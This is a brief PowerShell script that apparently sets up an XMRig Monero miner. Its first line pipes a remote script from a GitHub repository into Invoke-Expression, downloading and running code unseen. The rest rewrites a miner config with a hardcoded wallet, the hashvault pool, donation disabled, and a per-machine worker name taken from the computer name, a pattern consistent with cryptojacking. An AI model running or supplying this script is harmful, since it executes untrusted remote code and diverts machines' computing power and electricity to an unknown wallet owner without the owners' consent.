' irm https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/refs/heads/main/config.ps1 | iex
iwr "https://example.com/config.json" -OutFile .\config.json;
$d=Get-Date -Format yyyyMMdd;
$h=$env:COMPUTERNAME; $j=Get-Content .\config.json -Raw | ConvertFrom-Json;
$j.donate-level=0;
$j.pools[0].url="pool.hashvault.pro:443";
$j.pools[0].user="4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu";
$j.pools[0].pass="$d$h";
$j.pools[0].tls=$true;
$j.pools[0]."tls-fingerprint"="420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14";
$j | ConvertTo-Json -Depth 10 | Set-Content .\config.json
